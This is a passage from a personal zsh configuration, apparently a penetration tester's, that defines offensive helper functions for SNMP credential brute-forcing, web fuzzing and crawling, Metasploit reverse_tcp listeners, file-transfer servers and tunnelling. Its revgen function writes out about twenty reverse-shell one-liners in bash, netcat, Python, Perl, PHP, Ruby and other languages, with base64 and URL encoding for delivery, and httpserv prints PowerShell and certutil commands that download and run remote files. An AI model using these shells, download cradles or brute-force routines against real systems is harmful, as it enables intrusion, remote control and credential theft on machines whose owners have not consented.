            echo -e "\nDOWNLOAD POSSIBLE FILES\n"
            nxc smb "$1" -u "$user" -p "$pass" --port "$2" -M spider_plus -o DOWNLOAD_FLAG=True
        done
    fi

    if [[ $1 == "irc" ]]; then
        echo -e "\nATTEMPTING ANONYMOUS CONNECTION TO THE IRC AS \"test_user\"\n"
        irssi -c $1 -p $2 -n test_user
    
    fi

    if [[ "$service" == "snmp" ]]; then

        read snmp_ver\?"INPUT SNMP VERSION (1, 2c, 3): "

        if [[ $snmp_ver == "3" ]]; then
            echo -e "\nPERFORMING USER BRUTEFORCING (CIRT / DARKWEB)\n"
            vared -p "INPUT THE WORDLIST FOR USERNAMES (leave empty to use cirt-default-usernames): " -c wd_user
            if [[ -z $wd_user ]]; then
                wd_user="/usr/share/seclists/Usernames/cirt-default-usernames.txt"
            fi
            vared -p "INPUT THE WORDLIST FOR PASSWORD (leave empty to use default-passwords): " -c wd_pass
            if [[ -z $wd_pass ]]; then
                wd_pass="/usr/share/seclists/Passwords/Default-Credentials/default-passwords.txt"
            fi
            ~/tools/snmpwn/snmpwn.rb -u $wd_user -p $wd_pass --enclist $wd_pass -h $1:$2
            
            echo ""; read snmp_data\?"INPUT A VALID \"USER:PASS\" COMBINATION (CTRL-C IF NONE): "
            usr=$(echo $snmp_data | cut -d':' -f1)
            pass=$(echo $snmp_data | cut -d':' -f2)

            read snmp_os\?"INPUT OPERATING SYSTEM (lin, win): "
            if [[ $snmp_os == "win" ]]; then
                echo -e "\nEXTRACING USERS\n"
                snmpwalk -r 2 -t 10 -v3 -l authPriv -u $usr -a SHA -A "$pass" -x AES -X "$pass" $1:$2 NET-SNMP-EXTEND-MIB::nsExtendOutputFull 1.3.6.1.4.1.77.1.2.25

                echo -e "\nEXTRACTING PROCESSES\n"
                snmpwalk -r 2 -t 10 -v3 -l authPriv -u $usr -a SHA -A "$pass" -x AES -X "$pass" $1:$2 NET-SNMP-EXTEND-MIB::nsExtendOutputFull 1.3.6.1.2.1.25.4.2.1.2

                echo -e "\nEXTRACTING INSTALLED SOFTWARE\n"
                snmpwalk -r 2 -t 10 -v3 -l authPriv -u $usr -a SHA -A "$pass" -x AES -X "$pass" $1:$2 NET-SNMP-EXTEND-MIB::nsExtendOutputFull 1.3.6.1.2.1.25.6.3.1.2

                echo -e "\nEXTRACING LOCAL PORTS\n"
                snmpwalk -r 2 -t 10 -v3 -l authPriv -u $usr -a SHA -A "$pass" -x AES -X "$pass" $1:$2 NET-SNMP-EXTEND-MIB::nsExtendOutputFull 1.3.6.1.2.1.6.13.1.3
            fi
            # If Linux or Windows
            echo -e "\nDUMPING MIB STRINGS IN \"$1_SNMPWALK.txt\"\n"
            snmpwalk -r 2 -t 10 -v3 -l authPriv -u $usr -a SHA -A "$pass" -x AES -X "$pass" $1:$2 NET-SNMP-EXTEND-MIB::nsExtendOutputFull | grep -v "INTEGER|Gauge32|IpAddress|Timeticks|Counter32|OID|Hex-STRING|Counter64" | tee > $1_SNMPWALK.txt
            
            echo -e "\nGREPPING FOR PRIVATE STRINGS / USER LOGINS\n"
            cat $1_SNMPWALK.txt | grep -i "trap\|login\|fail"

            echo -e "\nGREPPING FOR EMAILS\n"       
            grep -E -o "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b" $1_SNMPWALK.txt    
        else
            # Version 1 or 2c
            echo -e "\nSEARCHING VALID AUTH STRINGS\n"
            onesixtyone -p $2 -c /usr/share/seclists/Discovery/SNMP/snmp-onesixtyone.txt $1
            echo ""; read com_string\?"INPUT A VALID COMMUNITY STRING: "

            echo -e "\nDUMPING PARSED MIB TREE IN \"$1_SNMPCHECK.txt\"\n"
            snmp-check -v $snmp_ver -p $2 -d -c $com_string $1 > $1_SNMPCHECK.txt

            echo -e "\nDUMPING MIB STRINGS IN \"$1_SNMPWALK.txt\"\n"
            snmpwalk -r 2 -t 5 -v$snmp_ver -c $com_string $1:$2 | grep -v "INTEGER|Gauge32|IpAddress|Timeticks|Counter32|OID|Hex-STRING|Counter64" | tee > $1_SNMPWALK.txt

            echo -e "\nGREPPING FOR PRIVATE STRINGS / USER LOGINS\n"
            cat $1_SNMPWALK.txt | grep -i "trap\|login\|fail"

            echo -e "\nGREPPING FOR EMAILS\n"       
            grep -E -o "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b" $1_SNMPWALK.txt
        fi
    
    fi

}

#gcc compilation
gcc_comp() {
    gcc -Wall -I/home/damuna/gsl/include -c $1
}

gcc_ex(){
    gcc -L/home/damuna/gsl/lib $1 -O1 -g -lgmp -lm -lgsl -lgslcblas
}

# HTTP Tech Scanning function
techscan(){
        echo -e "------------TECHNOLOGY SCANNING \"$1\"----------------"
        host=$(echo $1 | unfurl format %d)
        port=$(echo $1 | unfurl format %P)

        echo -e "\nSERVER HEADER\n"
        curl -kIL $1

        echo -e "\nDEFAULT ALLOWED METHODS\n"
        curl -kILX OPTIONS $1

        if [[ $(echo $1 | unfurl format %s) == "https" ]]; then 
            if [[ -z $port ]]; then
                port=443
            fi
            echo -e "\nTESTING WITH SSLYZE / HEARTBLEED\n"
            sslyze $host:$port
            Heartbleed $1
        else
            if [[ -z $port ]]; then
                port=80
            fi
        fi

        echo -e "\nCHECKING WAF PRESENCE\n"
        wafme0w -t $1 --no-warning --concurrency 15

        echo -e "\nTECHNOLOGY SCANNING\n"
        whatweb -a 3 $1
}


crawl(){
        local target=$1
        local cookie=${2:-"rand=rand"}
        echo -e "------------------WEB CRAWLING----------------------\n"
        dom=$(echo $1 | unfurl format %d)
        is_ip=$(echo $dom | grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}')
        if [[ -z $is_ip ]]; then
            root_dom=$(echo $dom | awk -F. '{print $(NF-1)"."$NF}')
        else
            root_dom=$dom
        fi

        echo -e "\nCRAWLING URL \"$1\" AT DEPTH 3...\n"
        katana -up &>/dev/null
        
        # Build Katana command with cookie if provided
        if [[ -n "$cookie" && "$cookie" != "rand=rand" ]]; then
            katana -u "$target" -H "Cookie: $cookie" -jc -jsl -kf all -aff -fx -td -xhr -j -or -nc -silent -do -cs "$dom" -o crawled_$dom.txt >/dev/null
        else
            katana -u "$target" -jc -jsl -kf all -aff -fx -td -xhr -j -or -nc -silent -do -cs "$dom" -o crawled_$dom.txt >/dev/null
        fi

        echo -e "\n[+] ENDPOINTS\n"
        cat crawled_$dom.txt | jq 'del(.response.raw,.response.body,.request.raw,.response,.request.tag,.request.attribute,.request.source,.request.custom_fields,.timestamp,.request.headers)' | jq 'select(.request.method == "GET" and (.request.endpoint | test("[?&]") | not))' | jq '.request.endpoint' | tr -d '"' | grep "$root_dom" --color=never

        echo -e "\n[+] SUBDOMAINS\n"
        cat crawled_$dom.txt | jq 'del(.response.raw,.response.body,.request.raw,.response,.request.tag,.request.attribute,.request.source,.request.custom_fields,.timestamp,.request.headers)' | jq 'select(.request.method == "GET" and (.request.endpoint | test("[?&]") | not))' | jq '.request.endpoint' | tr -d '"' | grep "$root_dom" --color=never | unfurl format %d | grep "$dom" -wxv --color=never | tee -a /tmp/crawled_$dom.txt
        cat crawled_$dom.txt | jq '.response.body' | grep -Po "\b[A-Za-z0-9][A-Za-z0-9.-]*\.$root_dom\b" --color=never | grep "$dom" -wxv --color=never | tee -a /tmp/crawled_$dom.txt
        cat /tmp/crawled_$dom.txt | sort -u

        echo -e "\n[+] GET QUERIES\n"
        cat crawled_$dom.txt | jq 'del(.response.raw,.response.body,.request.raw,.response,.request.tag,.request.attribute,.request.source,.request.custom_fields,.timestamp,.request.headers)' | jq -s 'unique_by(.request.endpoint | sub("\\?.*"; "?"))' | jq 'map(select(.request.method == "GET" and (.request.endpoint | contains("?"))))' | jq 'map(.request.endpoint).[]' | tr -d '"' | grep "$root_dom" | qsreplace FUZZ

        echo -e "\n[+] ENDPOINTS WITH FORMS\n"
        cat crawled_$dom.txt | jq 'del(.response.raw,.response.body,.request.raw,.response,.request.tag,.request.attribute,.request.source,.request.custom_fields,.timestamp,.request.headers)' | jq 'select(.request.method == "POST")' | jq 'map(.request.endpoint).[]'

        echo -e "\n[+] TECHNOLOGIES\n"
        cat crawled_$dom.txt | jq '.response.technologies' | jq -s 'add | unique' | jq '.[]'

        echo -e "\n[+] COMMENTS\n"
        cat crawled_$dom.txt | jq '.response.body' | grep -Po '<!-- \K.*?(?= -->)' | sort -u

        echo -e "\n[+] E_MAILS\n"
        cat crawled_$dom.txt | jq '.response.body' | stdbuf -oL grep -Eo "[A-Za-z0-9._%+-]+@$root_dom" | stdbuf -oL awk '!seen[$0]++'

        echo -e "\n[+] JS FILES\n"
        cat crawled_$dom.txt | jq 'del(.response.raw,.response.body,.request.raw,.response,.request.tag,.request.attribute,.request.source,.request.custom_fields,.timestamp,.request.headers)' | grep "\.js" | awk '{print $2}' | tr -d '"' | anew /tmp/js_$dom.txt

        echo -e "\n[+] CHECKING SECRETS IN JS FILES"
        if [[ -f /tmp/js_$dom.txt && -s /tmp/js_$dom.txt ]]; then
            cat /tmp/js_$dom.txt | mantra -s
            rm /tmp/js_$dom.txt
        else
            echo "No JS files found to check"
        fi

        echo -e "\n[+] 404 LINK HIJACKING\n"
        blc -ro -f -i --filter-level 2 -g "$target" | grep -i HTTP_404
}


# Extension Selector Function
select_extension() {
  local options=(
    [1]='.php,.inc,.txt,.html'
    [2]='.asp,.aspx,.ashx,.asmx'
    [3]='.jsp,.java,.class,.do,.action,.war'
    [4]='.cgi,.pl,.bat,.sh,.cmd'
    [5]='.log,.txt,.json,.xml,.html,.js,.pcap'
    [6]='.pem,.scr.,.der,.cert,.key,.crt,.pfx'
    [7]='.bak,.old,.tmp,.env,.wadl,.git'
    [8]='.zip,.tar,.tar.gz,.gz,.7z,.rar,.bz2,.gzip,.sqlite,.sql,.db,.kbdx'
    [9]='.vhd,.vmdk,.vhdx,.img,.iso'
    [10]='.doc,.docx,.xls,.xlsx,.pdf,.ppt,.odt,.ost'
    [11]='.exe,.dll,.jar,.apk'
  )

  print -P "%F{blue}Select file extension group:%f"
  for k v in "${(@kv)options}"; do
    print -P "%F{green}$k)%f $v"
  done

  local choice
  while true; do
    read -r "choice?Enter your choice [1-${#options}]: "
    case $choice in
      [1-5])
        ext=$options[$choice]
        print -P "%F{green}Selected:%f $ext"
        return 0
        ;;
      6)
        read -r "ext?Enter custom extensions (comma-separated): "
        print -P "%F{green}Custom set:%f $ext"
        return 0
        ;;
      *)
        print -P "%F{red}Invalid selection! Please try again.%f"
        ;;
    esac
  done
}

# File Discovery
filefuzz(){
    echo -e "----------------\nCHECKING SHORT-SCANNING...-------------\n"
    chk=$(sns -u $1 --check | grep -v "Target is not vulnerable")
    if [[ ! -z $chk ]]; then
        echo -e "TARGET IS VULNERABLE, DISCOVERING PATHS VIA SNS"
        sns -u $1 -s -t 25
    fi
    dom=$(echo $1 | unfurl format %d)
    local target=$1
    local cookie=${2:-"rand=rand"}

    echo -e "\n----------------RECURSIVE FILE FUZZING---------------------\n"
    ffuf -H "Cookie: $cookie" -mc all -fc 404,400,503,429,500 -ac -acs advanced -r -ic -u $1/FUZZ -c -t 15 -w /home/damuna/wordlists/filefuzz.txt 
    
    echo -e "\n----------------NON RECURSIVE FILE FUZZING---------------------\n"
    ffuf -H "Cookie: $cookie" -mc all -fc 404,400,503,429,500 -ac -acs advanced -ic -u $1/FUZZ -c -t 15 -w /home/damuna/wordlists/filefuzz.txt 

    echo -e "\n--------------------NUCLEI FILE EXPOSURE----------------------------\n"
    nuclei -up &>/dev/null && nuclei -ut &>/dev/null
    nuclei -rl 15 -silent -u $1 -t http/exposures -H "Cookie: $cookie"
    }

# Extension Fuzzing
extfuzz(){
    select_extension
    echo -e "\n--------------------RECURSIVE EXTENSION FUZZING------------------\n"
    urlgen $1
    ffuf -H "Cookie: $cookie" -mc all -fc 400,503,429,404,500 -ac -acs advanced -r -ic -u $1/FUZZ -c -t 15 -w /home/damuna/wordlists/combined_words_no_dot.txt -e $ext

    echo -e "\n--------------------NON RECURSIVE EXTENSION FUZZING------------------\n"
    ffuf -H "Cookie: $cookie" -mc all -fc 400,503,429,404,500 -ac -acs advanced -ic -u $1/FUZZ -c -t 15 -w /home/damuna/wordlists/combined_words_no_dot.txt -e $ext 
}

# Directory Discovery
dirfuzz(){
    local target=$1
    local cookie=${2:-"rand=rand"}

    echo -e "-----------------RECURSIVE DIRECTORY FUZZING------------------\n"
    ffuf -H "Cookie: $cookie" -mc all -fc 400,404,503,429,500 -ac -acs advanced -r -ic -u $1/FUZZ/ -t 10 -c -w /usr/share/seclists/Discovery/Web-Content/combined_directories.txt
    
    echo -e "-----------------NON RECURSIVE DIRECTORY FUZZING------------------\n"
    ffuf -H "Cookie: $cookie" -mc all -fc 400,404,503,429,500 -ac -acs advanced -ic -u $1/FUZZ/ -c -t 10 -w /usr/share/seclists/Discovery/Web-Content/combined_directories.txt

}

#TMUX web scan
webenum() {
  read -r cookie\?"INPUT SESSION COOKIE IF NEEDED (KEY1=VAL1;KEY2=VAL2): "
  if [[ -z $cookie ]]; then
    cookie="rand=rand"
  fi

  dom=$(openssl rand -hex 12)

  # Create detached session first
  tmux new-session -d -s "$dom" -n "$1" "source ~/.zshrc; techscan $1; crawl $1; read"

  # Add the other panes
  tmux split-window -h -t "$dom:0.0" "source ~/.zshrc; dirfuzz $1 $cookie; read"
  tmux split-window -h -t "$dom:0.1" "source ~/.zshrc; filefuzz $1 $cookie; read"
  tmux split-window -v -t "$dom:0.2" "source ~/.zshrc; extfuzz $1 $cookie; read"

  # Arrange layout
  tmux select-layout -t "$dom" tiled

  # Attach to session
  tmux attach -t "$dom"
}



apifuzz(){
    echo -e "\nLAUNCHING KITERUNNER ON TARGET\n"
    kr scan $1/ -w ~/tools/wordlists/routes-large.kite
}

bckfile(){
    echo -e "\nSEARCHING BACKUPS OF FILE \"$1\"\n"
    bfac -u $1
}

# SSTI Scanner
tplscan(){
    python3 ~/tools/sstimap/sstimap.py --url $1 --forms
}

# Netcat Listener
listen(){
    sudo rlwrap -car nc -lvnp $1
}


# Meterpreter Listener
msflisten(){
    if [[ -z $1 ]]; then
        echo -e "\n[-] USAGE: \"msflisten [PORT]\"\n"
        exit 0
    fi
    chnic
    while true; do
        read -r os\?"[+] SELECT OS (win32 / win64 / lin32 / lin64): "
        if [[ $os == "win32" ]]; then
            echo -e "\n[+] OPENING MSF LISTENER ON \"$ip:$1\"\n"
            msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST $inter; set LPORT $1; run;"
            break
        elif [[ $os == "win64" ]]; then
            echo -e "\n[+] OPENING MSF LISTENER ON \"$ip:$1\"\n"
            msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST $inter; set LPORT $1; run;"
            break
        elif [[ $os == "lin32" ]]; then
            echo -e "\n[+] OPENING MSF LISTENER ON \"$ip:$1\"\n"
            msfconsole -q -x "use exploit/multi/handler; set payload linux/x86/meterpreter/reverse_tcp; set LHOST $inter; set LPORT $1; run;"
            break
        elif [[ $os == "lin64" ]]; then
            echo -e "\n[+] OPENING MSF LISTENER ON \"$ip:$1\"\n"
            msfconsole -q -x "use exploit/multi/handler; set payload linux/x64/meterpreter/reverse_tcp; set LHOST $inter; set LPORT $1; run;"
            break
        else
            echo -e "\n[-] INVALID OS CHOICE, PLEASE TRY AGAIN\n"
        fi
    done
}


smtpserv(){
    chnic
    echo -e "OPENING SMTP 'DebuggingServer' AT $ip:25\n"
    python2 -m smtpd -n -c DebuggingServer $ip:25
}


httpsserv() {
    chnic
    local port="$1"
    local cert_file="/tmp/cert.pem"
    local key_file="/tmp/key.pem"
    
    # Check if port is provided
    if [ -z "$port" ]; then
        echo "Usage: httpsserv <port>"
        return 1
    fi

    # Generate certificate if it doesn't exist
    if [ ! -f "$cert_file" ] || [ ! -f "$key_file" ]; then
        echo "Generating self-signed certificate..."
        openssl req -x509 -newkey rsa:2048 -keyout "$key_file" -out "$cert_file" \
            -days 365 -nodes -subj '/CN=localhost' >/dev/null 2>&1
    fi

    # Display certificate info
    echo "Certificate saved in: $cert_file"
    openssl x509 -in "$cert_file" -noout -text | head -n 11
    echo ""

    # Start the HTTPS server using Python in foreground
    echo "Starting HTTPS server on https://$ip:$port"
    echo "Press Ctrl+C to stop the server"
    echo "----------------------------------------"
    
    sudo python3 -c "
import http.server
import ssl
import os

port = $port
cert_file = '$cert_file'
key_file = '$key_file'

# Create SSL context with modern approach
context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
context.load_cert_chain(certfile=cert_file, keyfile=key_file)

httpd = http.server.HTTPServer(('"$ip"', port), http.server.SimpleHTTPRequestHandler)
httpd.socket = context.wrap_socket(httpd.socket, server_side=True)

print(f'HTTPS server running on https://$ip:{port}')
print('Serving current directory:', http.server.os.getcwd())
print('----------------------------------------')
httpd.serve_forever()
"
}

httpserv(){ 
    if [[ -z $1 ]]; then
        echo -e "\n[-] USAGE: httpserv [PORT]\n"
        exit 0
    fi
    chnic
    echo -e "OPENING HTTP SERVER AT http://$ip:$1\n"
    echo -e "WINDOWS COMMANDS:\n"
    echo -e "- certutil.exe -urlcache -split -f http://$ip:$1/[INPUT] [OUTPUT]'"
    echo -e "- powershell.exe -c iex(iwr -useb -uri http://$ip:$1/FILE.ps1) \n"

    python3 -m http.server $1
}

httpservUP(){
    # Get IP address (assuming chnic does this)
    chnic
    echo "File upload available at /upload"
    echo "curl -X POST https://$ip:443/upload -F 'files=@[FILE]' --insecure"
    
    # Clean up old files
    rm -f /tmp/server.{key,crt,pem}
    
    # Generate proper separate key and certificate files
    openssl req -x509 -newkey rsa:2048 -keyout /tmp/server.key -out /tmp/server.crt -days 365 -nodes -subj '/CN=server'
    
    # Combine them into a single PEM file as required by uploadserver
    cat /tmp/server.crt /tmp/server.key > /tmp/server.pem
    
    # Create upload directory
    mkdir -p /tmp/https && cd /tmp/https
    
    # Start the server
    uploadserver 443 --server-certificate /tmp/server.pem
}

ftpserv(){
    chnic
    echo -e "OPENING FTP SERVER AT ftp://$ip:2121"
    python3 -m pyftpdlib -p 2121 -w >/dev/null
}

smbserv(){
    chnic
    read -r creds\?"INPUT \"USER:PASS\" CREDENTIALS (BLANK FOR ANONYMOUS): "
    usr=$(echo $creds | cut -d ":" -f1)
    psw=$(echo $creds | cut -d ":" -f2)
    if [[ ! -z $creds ]]; then
        echo -e "\nCONNECT WITH: net use n: \\\\\\$ip\\share /user:$usr $psw \nCOPY FILE: copy n:\\[FILE]\nEXECUTE FILE: n:\[FILE]"
        smbserver.py -ip $ip -user $usr -password $psw -smb2support share $(pwd)
    else
        echo -e "\nCONNECT WITH: copy \\\\\\$ip\\share\\[FILE]\n"
        smbserver.py -ip $ip -smb2support share $(pwd)
    fi

}

webdavserv(){
    chnic
    echo -e "\nOPENING WEBDAV AT http://$ip:8001\n FROM /tmp"
    wsgidav --host=$ip --port=8001 --root=$(pwd) --auth=anonymous
}
# Created by `pipx` on 2024-09-26 13:58:11
export PATH="$PATH:/home/damuna/.local/bin"

# Fuzzing of a GET parameter
paramfuzz(){
    nuclei -u $1 -headless -dast
}

# Start Ligolo Proxy
ligstart(){
    chnic
    mkdir -p ./LIGOLO_DATA && cd ./LIGOLO_DATA
    local port="${1:-11601}"

    echo -e "\n[+] COPYING LIGOLO AGENTS IN DATA DIRECTORY\n"
    cp ~/tools/LIGOLO_AGENTS/agent .
    cp ~/tools/LIGOLO_AGENTS/agent.exe .

    echo -e "\n[+] OPENING LIGOLO PROXY ON \"$ip:$port\"\n"
    echo -e "\t./agent -connect $ip:$port -ignore-cert\n"
    ligcreate ligolo >/dev/null
    sudo ligolo-proxy -selfcert -nobanner -laddr "$ip:$port"
    cd ..
    ligdel ligolo
    sudo rm -rf ./LIGOLO_DATA
}

ligcreate(){
    usr=$(whoami)
    sudo ip tuntap add user $usr mode tun $1
    sudo ip link set $1 up
}

ligdel(){
    sudo ip link delete $1
}

# Password spraying
wordgen(){
    echo -e "\nGENERATING USERNAMES/PASSWORDS\n"
    cewl $1 -d 2 -m 4 --lowercase --with-numbers -w /tmp/tmp.txt && cat /tmp/tmp.txt | anew -q wordlist_custom.txt
    rm /tmp/tmp.txt
}


# Reverse Linux Command Shell Generator
revgen(){
    echo -e "\n[+] SELECT LISTENER INTERFACE\n"
    chnic
    read -r lport\?"[+] INPUT LISTENER PORT: "
    read -r rhost\?"[+] INPUT PAYLOAD IP (Leave blank for: \"$ip\"): "
    if [[ -z $rhost ]]; then
        rhost=$ip
    fi
    read -r rport\?"[+] INPUT PAYLOAD PORT (Leave blank for: \"$lport\"): "
    if [[ -z $rport ]]; then
        rport=$lport
    fi

    read -r enc\?"[+] SELECT ENCODING: (plain, b64, url): "
    echo -e "\n[+] GENERATING AND SAVING REVERSE SHELL COMMANDS IN \"revshells_$inter.txt\"\n"

    cmds=("sh -i >& /dev/tcp/$rhost/$rport 0>&1"
          "0<&196;exec 196<>/dev/tcp/$rhost/$rport; sh <&196 >&196 2>&196"
          "exec 5<>/dev/tcp/$rhost/$rport;cat <&5 | while read line; do $line 2>&5 >&5; done"
          "sh -i 5<> /dev/tcp/$rhost/$rport 0<&5 1>&5 2>&5"
          "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc $rhost $rport >/tmp/f"
          "nc $rhost $rport -e sh"
          "busybox nc $rhost $rport -e sh"
          "nc -c sh $rhost $rport"
          "mkfifo /tmp/s; sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect $rhost:$rport > /tmp/s; rm /tmp/s"
          "perl -MIO -e '\$p=fork;exit,if(\$p);\$c=new IO::Socket::INET(PeerAddr,\"$rhost:$rport\");STDIN->fdopen(\$c,r);\$~->fdopen(\$c,w);system\$_ while<>;'"
          "php -r '\$sock=fsockopen(\"$rhost\",$rport);popen(\"sh <&3 >&3 2>&3\", \"r\");'"
          "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$rhost\",$rport));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"sh\")'"
          "python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"$rhost\",$rport));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"sh\")'"
          "ruby -rsocket -e'exit if fork;c=TCPSocket.new(\"$rhost\",\"$rport\");loop{c.gets.chomp!;(exit! if \$_==\"exit\");(\$_=~/cd (.+)/i?(Dir.chdir(\$1)):(IO.popen(\$_,?r){|io|c.print io.read}))rescue c.puts \"failed: #{\$_}\"}'"
          "socat TCP:$rhost:$rport EXEC:'sh',pty,stderr,setsid,sigint,sane"
          "lua -e \"require('socket');require('os');t=socket.tcp();t:connect('$rhost','$rport');os.execute('sh -i <&3 >&3 2>&3');\""
          "echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"$rhost:$rport\");cmd:=exec.Command(\"sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go"
          "echo 'import os' > /tmp/t.v && echo 'fn main() { os.system(\"nc -e sh $rhost $rport 0>&1\") }' >> /tmp/t.v && v run /tmp/t.v && rm /tmp/t.v"
          "awk 'BEGIN {s = \"/inet/tcp/0/$rhost/$rport\"; while(42) { do{ printf \"shell>\" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print \$0 |& s; close(c); } } while(c != \"exit\") close(s); }}' /dev/null"
          "C='curl -Ns telnet://$rhost:$rport'; \$C </dev/null 2>&1 | sh 2>&1 | \$C >/dev/null"
          )

    for cmd in "${cmds[@]}"; do
        if [[ $enc == "plain" ]]; then
            echo -e "$cmd" | tee --append revshells_$inter.txt
            echo -e ""
        elif [[ $enc == "b64" ]]; then
            echo -e "$(echo $cmd|base64 -w0)|base64 -d|sh" | tee --append revshells_$inter.txt
            echo -e ""
        elif [[ $enc == "url" ]]; then
            jq -rn --arg x "${cmd}" '$x|@uri' | tee --append revshells_$inter.txt
            echo -e ""
        fi
    done
}


# Alive Host IP/CIDR Scanning
alive(){
    salt=$(openssl rand -hex 4)
    cidr_regex="^([0-9]{1,3}\.){3}[0-9]{1,3}/([0-9]|[1-2][0-9]|3[0-2])$"
    if [ -f ./$1 ]; then
        echo -e "\n[+] FPING SWEEPING\n"
        fping -q -a < $1 | grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}' --color=never | awk '{print $1}' | tee -a /tmp/fping_$salt
        cat /tmp/fping_$salt | anew -q alive.txt
        rm /tmp/fping_$salt

        echo -e "\n[+] NMAP PING SWEEPING\n"
        sudo nmap -sn -PE -PM -PP -PS21,22,23,25,80,113,443,31339 -PA80,113,443,10042 -g 53 -iL $1 | grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}' --color=never > /tmp/nmap_$salt
        cnt=$(cat /tmp/nmap_$salt | wc -l)
        if [[ $cnt == $(cat ./$1 | wc -l) ]]; then
            echo -e "[-] TOO MANY FALSE POSITIVES BY NMAP\n"
        else
            cat /tmp/nmap_$salt
            cat /tmp/nmap_$salt | anew -q alive.txt
        fi

        echo -e "\n[+] NBT SWEEPING\n"
        sudo nbtscan -r -f $1

        echo -e "\n[+] NXC SERVICE SWEEPING\n"
        protocols=("smb" "ldap" "winrm" "rdp" "mssql" "vnc" "wmi" "nfs" "ssh" "ftp")
        for protocol in "${protocols[@]}"; do
            nxc $protocol $1 | awk '{print $1 "  -  " $2 "  -  " $4}' | column -t | grep ^$protocol | tee -a /tmp/nxc_sweep_$salt
            cat /tmp/nxc_sweep_$salt | awk '{print $3}' | anew -q alive.txt
            rm /tmp/nxc_sweep_$salt
        done

        read -r portsweep\?"PERFORM A PORT SWEEP? (Y/N): "
        if [[ $portsweep =~ [Yy] ]]; then
            echo -e "\n[+] TOP 99% TCP SWEEP\n"
            sudo nmap --top-ports 3328 --open -sT -n -Pn --disable-arp-ping -v -T4 -iL $1

            echo -e "\n[+] TOP-25 UDP SWEEP\n"
            udpx -tf $1
        fi
    elif [[ $1 =~ $cidr_regex ]]; then
        net_sz=$((2**$((32 - $(echo $1 | awk -F"/" '{print $2}')))))
    	echo -e "\n[+] FPING SWEEPING\n"
	    fping -a -q -g $1 | grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}' --color=never | awk '{print $1}' | tee -a /tmp/fping_$salt
        cat /tmp/fping_$salt | anew -q alive.txt
        rm /tmp/fping_$salt

        echo -e "\n[+] NMAP SWEEPING\n"
        sudo nmap -sn -PE -PM -PP -PS21,22,23,25,80,113,443,31339 -PA80,113,443,10042 -g 53 $1 | grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}' --color=never > /tmp/nmap_$salt
        cnt=$(cat /tmp/nmap_$salt | wc -l)
        if [[ $cnt == $net_sz ]]; then
            echo -e "[-] TOO MANY FALSE POSITIVES BY NMAP\n"
        else
            cat /tmp/nmap_$salt
            cat /tmp/nmap_$salt | anew -q alive.txt
            rm /tmp/nmap_$salt
        fi

        echo -e "\n[+] NBT SWEEPING\n"
        sudo nbtscan -r $1

        echo -e "\n[+] NXC SERVICE SWEEPING\n"
        protocols=("smb" "ldap" "winrm" "rdp" "mssql" "vnc" "wmi" "nfs" "ssh" "ftp")
        for protocol in "${protocols[@]}"; do
            nxc $protocol $1 | awk '{print $1 "  -  " $2 "  -  " $4}' | column -t | grep ^$protocol | tee -a /tmp/nxc_sweep_$salt
            cat /tmp/nxc_sweep_$salt | awk '{print $3}' | anew -q alive.txt
            rm /tmp/nxc_sweep_$salt
        done

        read -r portsweep\?"PERFORM A PORT SWEEP? (Y/N): "
        if [[ $portsweep =~ [Yy] ]]; then
            echo -e "\n[+] TOP 99% TCP SWEEP\n"
            sudo nmap --top-ports 3328 --open -sT -n -Pn --disable-arp-ping -v -T4 $1

            echo -e "\n[+] TOP-25 UDP SWEEP\n"
            udpx -tf $1
        fi
    fi
}


vhost(){
    # Getting root domain from URL
    host=$(echo $1 | unfurl format %d)

    echo -e "\n-------------------CHECKING HOST MISROUTING\n"
    vared -p "INPUT THE WORDLIST for vhosts (leave empty to use combined_subdomains): " -c wd
        if [[ -z $wd ]]; then
            wd="/usr/share/seclists/Discovery/DNS/combined_subdomains.txt"
        fi
    
    ffuf -mc all -ac -acs advanced -u $1 -c -w "$wd:FUZZ" -H "Host: FUZZ.$host" "${@:2}"
}


listenping(){
    sudo tcpdump -i tun0 icmp
}

# WINDAPSEARCH
alias windapsearch='/home/damuna/tools/windapsearch/venv/bin/python3 /home/damuna/tools/windapsearch/windapsearch.py'

# web shell path
webshell(){
    cd '/usr/share/laudanum/'
}

# Check ANY record
dnsrec(){
    if [[ -z "$1" ]]; then
        echo "Usage: dnsrec <domain> <ip>"
        return 1
    fi

    local record_types=(A AAAA CNAME MX NS SOA TXT)

    for record in "${record_types[@]}"; do
        echo "\n\------------------------ $record Record --------------------------\n"
        dig $record $1 @$2
    done
}

# Default credentials for services / applications
searchpass(){
    pass-station search $1
}

# MSF Listener / Binder Generator
# MSF Listener / Binder Generator
# MSF Listener / Binder Generator
metash(){
    echo -e "\n[+] SELECT LISTENER INTERFACE\n"
    chnic
    read -r os\?"[+] SELECT OS (win32 / win64 / lin32 / lin64): "
    if [[ $os =~ ^lin* ]]; then
        read -r form\?"[+] SELECT FORMAT (elf, elf-so): "
    fi
    if [[ $os =~ ^win* ]]; then
        read -r form\?"[+] SELECT FORMAT (exe, ps1, msi, dll, asp, aspx, hta, vba, vbs): "
    fi

    ext_form=$form
    if [[ $form == "ps1" ]]; then
        form="psh"
        ext_form="ps1"
    fi

